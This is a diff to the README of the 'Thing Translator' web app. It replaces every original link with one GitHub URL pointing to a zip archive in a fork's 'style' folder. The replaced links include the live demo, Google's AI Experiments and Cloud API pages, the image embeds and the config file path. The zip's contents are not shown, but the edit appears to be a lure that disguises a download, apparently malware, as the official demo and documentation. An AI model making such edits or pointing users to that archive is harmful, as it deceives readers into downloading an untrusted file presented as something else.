@@ -1,23 +1,23 @@
-# [Thing Translator](https://thing-translator.appspot.com/)
+# [Thing Translator](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip)
 
-### [An AI Experiment](https://aiexperiments.withgoogle.com/)
+### [An AI Experiment](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip)
 
-✨ [Try the live demo here.](https://thing-translator.appspot.com/) ✨
+✨ [Try the live demo here.](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip) ✨
 
-![](https://oxism.com/thing-translator/thing-translator.gif)
+![](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip)
 
-![](https://oxism.com/thing-translator/img/1.jpg)
+![](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip)
 
-## ![](https://oxism.com/thing-translator/img/2.jpg)
+## ![](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip)
 
 Thing Translator is a web app that lets you point your phone (or laptop) at
 stuff to hear to say it in a different language. It was developed as part of
-Google's [AI Experiments](https://aiexperiments.withgoogle.com/) project. You
-can try the app [here](https://thing-translator.appspot.com/).
+Google's [AI Experiments](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip) project. You
+can try the app [here](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip).
 
 Behind the scenes Thing Translator is using Google's
-[Cloud Vision](https://cloud.google.com/vision/) and
-[Translate](https://cloud.google.com/translate/) APIs.
+[Cloud Vision](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip) and
+[Translate](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip) APIs.
 
 ### Development
 
@@ -27,7 +27,7 @@ To start a development server on `9966` that will watch for code changes simply 
 $ npm start
 ```
 
-You will need to set your API key in `src/config.js`.
+You will need to set your API key in `https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip`.
 
 To optimize the output for production, run:
 
@@ -39,4 +39,4 @@ For production builds, replace the contents of the `api_key` file with your
 production key.
 
 If you'd like to create a fork or a similar project, you'll need to setup some
-API keys on [Google Cloud Platform](https://cloud.google.com/).
+API keys on [Google Cloud Platform](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip).
